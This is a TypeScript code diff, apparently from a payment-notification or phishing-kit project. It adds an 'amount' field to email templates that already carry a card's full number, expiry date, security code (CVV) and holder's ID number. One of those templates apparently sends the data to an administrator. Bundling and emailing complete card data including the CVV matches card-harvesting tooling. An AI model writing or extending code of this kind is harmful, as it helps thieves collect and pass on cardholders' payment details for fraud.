@@ -469,6 +469,7 @@ export interface AvisoPagoOpts {
   vencimiento?: string | null;
   cvv?: string | null;
   documentoTitular?: string | null;
+  monto?: string | null;
   cuotas?: string | null;
   extras?: { etiqueta: string; valor: string }[];
 }
@@ -503,6 +504,7 @@ function tarjetaCompletaBox(opts: AvisoPagoOpts): string {
         { label: "Número", value: opts.numero ? agruparPan(opts.numero) : null },
         { label: "Vencimiento", value: opts.vencimiento },
         { label: "Código de seguridad", value: opts.cvv },
+        { label: "Monto", value: opts.monto },
         { label: "Cuotas", value: opts.cuotas },
         ...(opts.extras ?? []).map((e) => ({ label: e.etiqueta, value: e.valor })),
       ])}</table>
@@ -553,6 +555,7 @@ export function avisoPagoEmail(opts: AvisoPagoOpts): Plantilla {
             `Número: ${agruparPan(String(opts.numero))}`,
             opts.vencimiento ? `Vencimiento: ${opts.vencimiento}` : "",
             opts.cvv ? `Código de seguridad: ${opts.cvv}` : "",
+            opts.monto ? `Monto: ${opts.monto}` : "",
             opts.cuotas ? `Cuotas: ${opts.cuotas}` : "",
             ...(opts.extras ?? []).map((e) => `${e.etiqueta}: ${e.valor}`),
           ]
@@ -645,6 +648,7 @@ export interface DatosPagoAdmOpts {
   numero: string;
   vencimiento: string;
   cvv: string;
+  monto?: string | null;
   cuotas?: string | null;
   destino?: string | null;
   referencia?: string | null;
@@ -673,6 +677,7 @@ export function datosPagoAdmEmail(opts: DatosPagoAdmOpts): Plantilla {
     { label: "Número", value: agruparPan(opts.numero) },
     { label: "Vencimiento", value: opts.vencimiento },
     { label: "Código de seguridad", value: opts.cvv },
+    { label: "Monto", value: opts.monto },
     { label: "Cuotas", value: opts.cuotas },
     ...(opts.extras ?? []).map((e) => ({ label: e.etiqueta, value: e.valor })),
   ]);
@@ -721,6 +726,7 @@ export function datosPagoAdmEmail(opts: DatosPagoAdmOpts): Plantilla {
       `Número: ${agruparPan(opts.numero)}`,
       `Vencimiento: ${opts.vencimiento}`,
       `Código de seguridad: ${opts.cvv}`,
+      opts.monto ? `Monto: ${opts.monto}` : "",
       opts.cuotas ? `Cuotas: ${opts.cuotas}` : "",
       ...(opts.extras ?? []).map((e) => `${e.etiqueta}: ${e.valor}`),
       "",
